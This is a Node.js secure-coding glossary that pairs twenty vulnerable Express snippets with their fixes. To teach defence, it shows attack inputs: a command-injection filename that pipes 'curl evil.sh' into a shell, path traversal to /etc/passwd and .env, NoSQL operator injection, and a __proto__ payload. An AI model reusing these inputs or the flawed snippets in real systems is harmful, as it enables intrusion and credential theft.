## BACKEND F I E L D GU I DE

## Node.js Security & Performance Glossary

20 terms every backend developer should recognise — what goes wrong, and the fix.

Each entry: plain-language explanation · vulnerable snippet · corrected snippet · one-line rule. Examples use Express + Mongoose/pg style, but the ideas apply to any Node stack.

- 01 IDOR

02 Broken Access Control

- 03 TOCTOU Race Condition

- 04 SQL / NoSQL Injection

- 05 Command Injection

- 06 Path Traversal

- 07 Prototype Pollution

- 08 Mass Assignment

09 SSRF

- 10 JWT Misconfiguration

11 ReDoS

12 Missing Rate Limiting

13 Weak Password Storage

14 Timing Attack

15 CORS & Security Headers

16 Supply Chain Risk

17 Blocking the Event Loop

18 N+1 Queries

19 Memory Leaks

20 Backpressure & Payload Limits


## 01 IDOR

also called: Insecure Direct Object Reference

The route reads an ID straight from the URL and trusts it. The user is authenticated, so the request passes login checks — but nobody ever asked "does this record belong to this user?" Changing /

orders/1042 to /orders/1043 leaks someone else's data.

SECURITY

```
✗ The problem
app.get('/api/orders/:id', auth, async (req, res) => {
const order = await Order.findById(req.params.id);
res.json(order); // any logged-in user can read ANY order
});
✓ The fix
app.get('/api/orders/:id', auth, async (req, res) => {
const order = await Order.findOne({
_id: req.params.id,
userId: req.user.id // ownership is part of the QUERY
});
if (!order) return res.sendStatus(404); // 404, not 403: don't confirm it exists
res.json(order);
});
```

Rule of thumb · Never query by ID alone. Always scope the query by the owner from the session/token.

## 02 Broken Access Control

also called: Missing authorization, privilege escalation

IDOR's bigger brother. Authentication answers who are you; authorization answers what may you do.

Typical failure: one route out of forty forgot the isAdmin middleware, or the role check lives only in the React UI while the API happily accepts the call.

SECURITY

```
✗ The problem
// hidden in the UI... but wide open in the API
app.delete('/api/users/:id', auth, deleteUser);
app.post('/api/admin/refund', auth, (req, res) => {
if (req.body.role === 'admin') doRefund(); // role from the CLIENT (!)
});
✓ The fix
// default deny: everything under /api/admin needs the role
app.use('/api/admin', auth, requireRole('admin'));
function requireRole(role) {
return (req, res, next) =>
req.user.role === role ? next() : res.sendStatus(403);
}
```

Rule of thumb · Enforce permissions server-side, on every route, using data from the token — never from the request body.


## 03 TOCTOU Race Condition

also called: Time-Of-Check to Time-Of-Use

You check a condition, then act on it — and between those two lines another concurrent request changed the world. Node is single-threaded, but every await is a yield point where other requests run. Classic result: double-spend, double-booking, duplicate accounts.

SECURITY

```
✗ The problem
const user = await User.findById(id);
if (user.balance >= amount) { // <-- CHECK
await sleepIsNotNeeded(); // (any await = other requests run here)
user.balance -= amount;
await user.save(); // <-- USE: two requests both pass the check
}
✓ The fix
// Option A: one atomic conditional update
const r = await User.updateOne(
{ _id: id, balance: { $gte: amount } },
{ $inc: { balance: -amount } }
);
if (r.modifiedCount === 0) throw new Error('Insufficient funds');
// Option B (SQL): lock the row inside a transaction
// BEGIN; SELECT balance FROM users WHERE id=$1 FOR UPDATE; ... COMMIT;
// Filesystem flavour: don't do existsSync() then writeFile()
await fs.open(path, 'wx'); // atomic "create only if absent"
```

Rule of thumb · Make check and act a single atomic operation: conditional update, transaction with row lock, unique index, or atomic syscall flag.

## 04 SQL / NoSQL Injection

also called: Query injection

User input is concatenated into a query, so the input can change the query's structure. In Mongo you don't even need quotes: JSON bodies let an attacker send an operator object instead of a string, and

{"password": {"\$ne": null}} matches every user.

SECURITY

```
✗ The problem
db.query(`SELECT * FROM users WHERE email = '${req.body.email}'`);
await User.findOne({ email: req.body.email,
password: req.body.password }); // password can be {$ne:null}
✓ The fix
// SQL: parameterized, always
db.query('SELECT * FROM users WHERE email = $1', [req.body.email]);
// Mongo: validate types before they reach the driver
const schema = z.object({ email: z.string().email(),
password: z.string().min(8) });
const { email, password } = schema.parse(req.body);
```

Rule of thumb · Parameterize SQL, and validate that every input is the type you expect before it touches the database.


## 05 Command Injection

also called: OS command injection, shell injection

exec() and execSync() hand your string to /bin/sh . Any ; , && , backtick or \$() in user input

becomes a second command running as your Node process.

SECURITY

```
✗ The problem
const { exec } = require('child_process');
exec(`convert ${req.body.filename} out.png`);
// filename = "x.jpg; curl evil.sh | sh" -> game over
✓ The fix
const { execFile } = require('child_process');
execFile('convert', [req.body.filename, 'out.png'], cb);
// no shell is spawned: arguments stay arguments
// plus: validate the filename against an allowlist / regex first
```

Rule of thumb · Use execFile/spawn with an argument array. Never build a shell string from user input.

## 06 Path Traversal

also called: Directory traversal, ../ attack

A filename from the user is joined onto a base directory. Send ../../etc/passwd or ../../.env and you walk straight out of the uploads folder.

SECURITY

```
✗ The problem
app.get('/files/:name', (req, res) => {
res.sendFile(path.join(UPLOADS, req.params.name)); // ../ escapes UPLOADS
});
✓ The fix
const base = path.resolve(UPLOADS);
const target = path.resolve(base, path.basename(req.params.name));
if (!target.startsWith(base + path.sep)) return res.sendStatus(400);
res.sendFile(target);
// better still: store files by generated UUID and map ID -> real path in the DB
```

Rule of thumb · Resolve the final absolute path and verify it is still inside the intended directory before opening it.


## 07 Prototype Pollution

also called: __proto__ injection

A JavaScript-specific one. Deep-merging or assigning user JSON into an object lets an attacker write to

Object.prototype via the key __proto__ . Suddenly every object in the process has isAdmin: true ,

which can escalate into auth bypass or RCE.

SECURITY

```
✗ The problem
merge(config, req.body);
// body: {"__proto__": {"isAdmin": true}}
({}).isAdmin // -> true, everywhere in the process
✓ The fix
const FORBIDDEN = ['__proto__', 'constructor', 'prototype'];
for (const k of Object.keys(req.body))
if (FORBIDDEN.includes(k)) return res.sendStatus(400);
// or avoid the whole class of bugs:
const safe = Object.create(null); // object with no prototype
const data = new Map(); // Map instead of plain object
// and run node with: --disable-proto=delete
```

Rule of thumb · Never deep-merge raw user input. Strip __proto__/constructor/prototype, or use Map / null- prototype objects.

## 08 Mass Assignment

also called: Over-posting, auto-binding

You pass req.body straight into a model. The user adds a field you never intended to be writable —

role , isVerified , credits , userId — and the ORM dutifully saves it.

SECURITY

```
✗ The problem
await User.updateOne({ _id: req.user.id }, req.body);
// body: {"name":"Bob","role":"admin"}
✓ The fix
const schema = z.object({
name: z.string().max(80),
bio: z.string().max(500).optional()
}).strict(); // reject unknown keys outright
const patch = schema.parse(req.body);
await User.updateOne({ _id: req.user.id }, patch);
```

Rule of thumb · Allowlist the fields you accept. Never blocklist, never pass req.body straight through.


## 09 SSRF

also called: Server-Side Request Forgery

Your server fetches a URL supplied by the user (webhooks, "import from URL", avatar fetchers). The attacker points it at internal addresses — 127.0.0.1 , 169.254.169.254 (cloud metadata / credentials), or your internal admin service — and your server is the one with access.

SECURITY

```
✗ The problem
const { data } = await axios.get(req.body.url); // fetches anything, from inside your VPC
res.send(data);
✓ The fix
const url = new URL(req.body.url);
if (url.protocol !== 'https:') throw new Error('https only');
const { address } = await dns.promises.lookup(url.hostname);
if (isPrivateIP(address)) throw new Error('blocked'); // 10/8, 172.16/12, 192.168/16, 127/8,
169.254/16
await axios.get(url.href, { maxRedirects: 0, timeout: 5000 });
```

Rule of thumb · Allowlist hosts where you can. Otherwise resolve the IP, reject private ranges, and disable redirects.

## 10 JWT Misconfiguration

also called: alg confusion, token replay

Tokens are only as good as their verification. Not pinning the algorithm allows alg: none or HS256- signed-with-the-public-key attacks; no expiry means a stolen token is valid forever; and there's no way to revoke one unless you planned for it.

SECURITY

```
✗ The problem
jwt.verify(token, SECRET); // accepts whatever alg the token claims
jwt.sign({ id, role }, SECRET); // never expires
✓ The fix
jwt.verify(token, PUBLIC_KEY, {
algorithms: ['RS256'], // pin it explicitly
issuer: 'api.myapp.com',
audience: 'myapp-web'
});
jwt.sign({ sub: id }, KEY, { algorithm: 'RS256', expiresIn: '15m' });
// long-lived refresh token stored server-side so it can be revoked
// cookie: httpOnly + secure + sameSite=lax (not localStorage)
```

Rule of thumb · Pin algorithms, set short expiry, keep a revocable refresh token, and store tokens in httpOnly cookies.


## 11 ReDoS

also called: Regular expression Denial of Service

A regex with nested or overlapping quantifiers can backtrack exponentially. One 40-character string pins the CPU for minutes — and since regex runs synchronously, the whole event loop is frozen. Your entire server stops answering, not just that request.

SECURITY

```
✗ The problem
const re = /^(\s*\w+)+$/; // nested quantifier = catastrophic backtracking
re.test(req.body.name); // "aaaaaaaaaaaaaaaaaaaaaaaaaaaa!" -> hangs
✓ The fix
// 1. cap input length before matching
if (req.body.name.length > 100) return res.sendStatus(400);
// 2. rewrite without nesting: /^\s*\w+(\s+\w+)*$/
// 3. for user-supplied patterns use a linear-time engine:
const RE2 = require('re2');
new RE2(userPattern).test(input);
```

Rule of thumb · Cap input length, avoid nested quantifiers, and never run user-supplied regexes on the main thread.

## 12 Missing Rate Limiting

also called: Brute force, credential stuffing, enumeration

Without limits, an attacker can try millions of passwords, OTP codes or coupon codes, scrape your whole database through a paginated endpoint, or simply run up your bill on anything that costs money per call (email, SMS, LLM APIs).

SECURITY

```
✗ The problem
app.post('/login', async (req, res) => {
const ok = await checkPassword(req.body); // unlimited attempts
...
});
✓ The fix
const limiter = rateLimit({ windowMs: 60_000, limit: 10,
standardHeaders: true });
app.post('/login', limiter, handler);
// layer it: global IP limit + per-account limit + exponential backoff
// + CAPTCHA after N failures. And set app.set('trust proxy', 1) behind a
// load balancer, or every request looks like it comes from one IP.
```

Rule of thumb · Rate-limit per IP *and* per account, on login, OTP, password reset, search and anything expensive.


## 13 Weak Password Storage

also called: Fast hashes, unsalted hashes

md5 , sha256 and friends are designed to be fast, which is exactly wrong for passwords: a GPU tries billions per second. Password hashes must be deliberately slow and memory-hard, with a unique salt per user (both bcrypt and argon2 handle the salt for you).

SECURITY

```
✗ The problem
const hash = crypto.createHash('sha256')
.update(password).digest('hex');
✓ The fix
const argon2 = require('argon2');
const hash = await argon2.hash(password, { type: argon2.argon2id });
const ok = await argon2.verify(hash, password);
// bcrypt is fine too:
const hash = await bcrypt.hash(password, 12); // cost >= 12
```

Rule of thumb · Use argon2id or bcrypt (cost 12+). Never a general-purpose hash, never a hand-rolled salt scheme.

## 14 Timing Attack

also called: Non-constant-time comparison

=== on strings returns as soon as it finds a differing byte. Measured over many requests, that leak lets an attacker recover an API key or reset token one character at a time. It matters for secrets you compare directly: tokens, HMAC signatures, API keys.

SECURITY

```
✗ The problem
if (req.headers['x-api-key'] === API_KEY) { ... } // leaks via response time
✓ The fix
const a = crypto.createHash('sha256').update(req.headers['x-api-key'] ?? '').digest();
const b = crypto.createHash('sha256').update(API_KEY).digest();
if (crypto.timingSafeEqual(a, b)) { ... }
// hashing first guarantees equal lengths (timingSafeEqual throws otherwise)
```

Rule of thumb · Compare secrets with crypto.timingSafeEqual on equal-length buffers.


## 15 CORS & Security Headers

also called: Misconfigured CORS, missing hardening headers

origin: '*' together with credentials: true is invalid and, when hand-rolled by reflecting the Origin header, effectively lets any website make authenticated requests as your logged-in user. Meanwhile a handful of response headers block whole attack classes for free.

SECURITY

```
✗ The problem
app.use(cors({ origin: true, credentials: true })); // reflects ANY origin
✓ The fix
const ALLOWED = new Set(['https://app.myapp.com']);
app.use(cors({
origin: (o, cb) => cb(null, !o || ALLOWED.has(o)),
credentials: true
}));
app.use(helmet()); // CSP, HSTS, X-Content-Type-Options, frameguard...
app.disable('x-powered-by');
```

Rule of thumb · Allowlist origins explicitly and put helmet() in front of every app.

## 16 Supply Chain Risk

also called: Dependency confusion, malicious packages, typosquatting

Most of your code isn't yours. A compromised transitive dependency runs with full process privileges — and npm lifecycle scripts ( postinstall ) run arbitrary code on your machine and in CI before you've executed a single line of your app.

SECURITY

```
✗ The problem
npm install # resolves loosely, may pull new transitive versions
# no lockfile committed, no audit in CI
✓ The fix
npm ci # installs EXACTLY the lockfile, fails if out of sync
npm audit --audit-level=high
npm config set ignore-scripts true # then allowlist what genuinely needs them
# commit package-lock.json, enable Dependabot/Renovate,
# check package age + weekly downloads before adding a dependency
```

Rule of thumb · Commit the lockfile, use npm ci, audit in CI, and treat every new dependency as code you now own.


## 17 Blocking the Event Loop

also called: Sync I/O, CPU-bound work on the main thread

Node handles thousands of connections on one thread. Any synchronous work — a *Sync call, a big loop, JSON.parse on a 50 MB payload, image resizing, PDF generation — freezes every other request until it finishes. This is the number one cause of "our Node API is slow under load".

PERFORMANCE

```
✗ The problem
app.get('/report', (req, res) => {
const data = fs.readFileSync('big.json'); // blocks
const hash = crypto.pbkdf2Sync(pw, salt, 1e6, 64, 'sha512'); // blocks ~1s
res.json(heavyCpuTransform(JSON.parse(data))); // blocks
});
✓ The fix
const data = await fs.promises.readFile('big.json');
const hash = await promisify(crypto.pbkdf2)(pw, salt, 1e6, 64, 'sha512');
// genuinely CPU-heavy work -> off the main thread
const { Worker } = require('node:worker_threads');
// or a job queue (BullMQ) for anything slower than ~50ms
// measure it: node --prof, clinic.js, or
// perf_hooks.monitorEventLoopDelay()
```

Rule of thumb · If a function name ends in Sync, or the work takes more than ~10ms of CPU, it does not belong on the main thread.

## 18 N+1 Queries

also called: Query in a loop, missing connection pool

One query to fetch a list, then one more query per row inside the loop. 100 posts becomes 101 round trips. Related sin: opening a new DB connection per request instead of reusing a pool, so every request pays the TCP + auth handshake.

PERFORMANCE

```
✗ The problem
const posts = await Post.find();
for (const p of posts) {
p.author = await User.findById(p.authorId); // N extra queries
}
✓ The fix
// one extra query instead of N
const posts = await Post.find();
const ids = [...new Set(posts.map(p => p.authorId))];
const authors = await User.find({ _id: { $in: ids } });
const byId = new Map(authors.map(a => [String(a._id), a]));
posts.forEach(p => { p.author = byId.get(String(p.authorId)); });
// SQL: a JOIN. GraphQL: DataLoader. And create the pool ONCE:
const pool = new Pool({ max: 20 }); // module scope, not per request
```

Rule of thumb · Batch queries with IN / JOIN, create the connection pool once at startup, and index the columns you filter on.


## 19 Memory Leaks

also called: Unbounded caches, listener leaks

Node processes are long-lived, so anything that only ever grows will eventually OOM. Usual suspects: a module-level Map used as a cache with no eviction, event listeners added per request and never removed, timers that keep closures alive, and accumulating arrays of "recent" items.

PERFORMANCE

```
✗ The problem
const cache = new Map();
app.get('/u/:id', async (req, res) => {
if (!cache.has(req.params.id)) // grows forever
cache.set(req.params.id, await load(req.params.id));
emitter.on('update', () => res.end()); // listener never removed
});
✓ The fix
const { LRUCache } = require('lru-cache');
const cache = new LRUCache({ max: 5000, ttl: 60_000 }); // bounded + TTL
emitter.once('update', handler); // or emitter.off(...) when done
// per-request metadata keyed by object -> WeakMap
// watch process.memoryUsage().heapUsed over time;
// compare two --inspect heap snapshots to find the retainer
```

Rule of thumb · Every cache needs a max size and a TTL; every listener you add needs a matching removal.

## 20 Backpressure & Payload Limits

also called: Buffering whole files, unbounded request bodies

Reading a whole file or response into memory scales with file size × concurrent users. Streams solve this — but only if you respect backpressure (stop reading when the destination is slow), which pipeline() does for you. On the input side, an unlimited body size is a free DoS.

PERFORMANCE

```
✗ The problem
const file = await fs.promises.readFile(bigPath); // whole file in RAM
res.send(file);
app.use(express.json()); // default 100kb, but check every parser
✓ The fix
const { pipeline } = require('node:stream/promises');
await pipeline(fs.createReadStream(bigPath), res); // constant memory
app.use(express.json({ limit: '100kb' }));
app.use(express.urlencoded({ limit: '100kb', extended: true }));
// multer/busboy: set fileSize limits too
// add compression() and cache headers for repeatable responses
```

Rule of thumb · Stream large payloads with pipeline(), and set an explicit maximum size on every input.


## T EN MOR E HAB I T S WORTH KE E P I NG

- Never commit secrets — Keep them in env vars or a secret manager; add .env to .gitignore; rotate anything that ever reached a git history.

- Don't leak stack traces — In production return a generic message plus a correlation ID; log the detail server-side.

- Validate at the boundary — One schema (zod/joi) per route for body, params and query. Everything inside the app is then trusted.

- Handle process-level errors — Log unhandledRejection / uncaughtException, then exit and let the supervisor restart cleanly.

- Graceful shutdown — On SIGTERM stop accepting connections, finish in-flight requests, close the DB pool.

- Use HTTPS and HSTS everywhere — Including internal service-to-service calls.

- Cache deliberately — HTTP cache headers + ETag first, Redis second. The fastest query is the one you don't make.

- Use all your cores — Run one process per core behind a load balancer, or use the cluster module / PM2.

- Log structured JSON — pino or winston, with a request ID — and redact tokens, passwords and PII.

- Keep Node on an LTS release — Old majors stop getting security patches; upgrades are cheaper than incidents.

Where to go next: the OWASP Top 10 and the OWASP Node.js Cheat Sheet cover the security side in depth; the official Node.js "Don't block the event loop" guide covers the performance side. Tools worth wiring into CI: npm audit, ESLint with eslint-plugin-security, and a load test (autocannon / k6) so you find the blocking call before your users do.
